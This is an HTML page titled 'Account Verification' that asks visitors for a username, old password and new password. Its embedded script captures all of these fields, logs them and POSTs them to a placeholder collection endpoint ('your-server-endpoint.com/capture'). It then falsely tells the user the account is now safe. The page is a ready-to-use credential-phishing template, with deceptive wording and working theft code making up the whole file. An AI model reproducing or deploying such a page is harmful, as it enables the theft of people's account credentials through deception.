<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px auto;
            max-width: 400px;
            text-align: center;
            background-color: #eec3e7;
        }
        input {
            display: block;
            margin: 10px 0;
            padding: 10px;
            width: 90%;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .thank-you {
            display: none;
            font-size: 18px;
            color: green;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h2>Account Verification</h2><br>
    <p>Please verify your account by filling in the details below:</p><br>
    <form id="verificationForm">
        <input type="text" id="username" placeholder="Username" required><br>
        <input type="password" id="oldPassword" placeholder="Old Password" required><br>
        <input type="password" id="newPassword" placeholder="New Password" required><br>
        <input type="password" id="confirmPassword" placeholder="Confirm Password" required><br>
        <button type="submit">Submit</button>
    </form>
    <div class="thank-you">Thank you, your account is safe now!</div>

    <script>
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent actual form submission

            // Capture the input data
            const username = document.getElementById('username').value;
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;

            // Log the captured data to the console (for demonstration)
            console.log(`Username: ${username}`);
            console.log(`Old Password: ${oldPassword}`);
            console.log(`New Password: ${newPassword}`);
            console.log(`Confirm Password: ${confirmPassword}`);

            // Send the data to your server (replace with your server's endpoint)
            fetch('http://your-server-endpoint.com/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, oldPassword, newPassword, confirmPassword })
            })
            .then(response => console.log('Data sent successfully:', response))
            .catch(error => console.error('Error:', error));

            // Display the thank-you message
            document.querySelector('.thank-you').style.display = 'block';

            // Clear the form
            e.target.reset();
        });
    </script>
</body>
</html>
